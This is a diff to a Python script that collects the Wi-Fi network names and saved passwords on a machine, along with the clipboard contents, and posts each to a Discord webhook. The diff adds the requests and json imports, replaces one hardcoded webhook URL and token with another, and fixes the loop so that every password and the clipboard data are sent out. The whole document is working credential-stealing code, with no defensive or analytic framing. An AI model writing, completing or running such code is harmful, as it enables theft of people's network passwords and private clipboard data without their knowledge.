@@ -1,5 +1,8 @@
+import os
 import subprocess
 import pyperclip
+import requests
+import json
 
 def get_networks():
     networks = {}
@@ -43,12 +46,9 @@ def get_clipboard_content():
 if __name__ == "__main__":
     wifi_passwords = get_networks()
     clipboard_data = get_clipboard_content()
-
-
+    url = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
     for wifi, password in wifi_passwords.items():
         p1 = {"content":f"{wifi}: {password}"}
-   
-   p2 = {"content":f"Clipboard: {clipboard_data}"}
-   url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
-    response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})
-    response = requests.post(url, data=json.dumps(p1),headers={"Content-Type": "application/json"})
+        response = requests.post(url, data=json.dumps(p1),headers={"Content-Type": "application/json"})
+    p2 = {"content":f"Clipboard: {clipboard_data}"}
+    response = requests.post(url, data=json.dumps(p2),headers={"Content-Type": "application/json"})
